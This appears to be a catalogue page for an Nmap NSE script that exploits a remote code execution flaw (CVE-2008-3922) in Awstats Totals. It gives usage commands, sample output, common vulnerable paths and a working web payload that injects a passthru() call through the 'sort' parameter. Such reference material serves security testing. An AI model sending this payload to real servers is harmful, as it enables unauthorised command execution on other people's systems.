---
title: "http-awstatstotals-exec"
source: unofficial
category: "Vuln"
categories:
  - "vuln"
  - "intrusive"
  - "exploit"
shortDescription: "http-awstatstotals-exec exploits a remote code execution vulnerability in Awstats Totals 1.0 up to 1.14 and possibly other products based on it. [CVE: 2008-3922]"
risk: intrusive
tags:
  - "vuln"
  - "intrusive"
  - "exploit"
  - "cldrn/nmap-nse-scripts"
scriptTypes: []
protocols: []
ports: []
usage: "nmap -sV --script http-awstatstotals-exec.nse --script-args 'http-awstatstotals-exec.cmd=\"uname -a\", http-awstatstotals-exec.uri=/awstats/index.php' <target>\nnmap -sV --script http-awstatstotals-exec.nse <target>"
outputPreview:
  - "PORT   STATE SERVICE REASON"
  - "80/tcp open  http    syn-ack"
  - "| http-awstatstotals-exec.nse:"
  - "|_Output for 'uname -a':Linux 2.4.19 #1 Son Apr 14 09:53:28 CEST 2002 i686 GNU/Linux"
author: "Paulino Calderon (upstream: cldrn/nmap-nse-scripts)"
reference:
  label: "View Upstream Script Source"
  url: "https://github.com/cldrn/nmap-nse-scripts/blob/master/old-scripts/http-awstatstotals-exec.nse"
---

Imported from the upstream repository [cldrn/nmap-nse-scripts](https://github.com/cldrn/nmap-nse-scripts).
http-awstatstotals-exec exploits a remote code execution vulnerability in Awstats Totals 1.0 up to 1.14 and possibly other products based on it. [CVE: 2008-3922]
This vulnerability can be exploited through the GET variable sort. The script queries the web server with the command payload encoded using PHP's chr() function:
<code>?sort={%24{passthru%28chr(117).chr(110).chr(97).chr(109).chr(101).chr(32).chr(45).chr(97)%29}}{%24{exit%28%29}}</code>
Common paths for Awstats Total:
* <code>/awstats/index.php</code>
* <code>/awstatstotals/index.php</code>
* <code>/awstats/awstatstotals.php</code>
References:
* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3922
* http://www.exploit-db.com/exploits/17324/
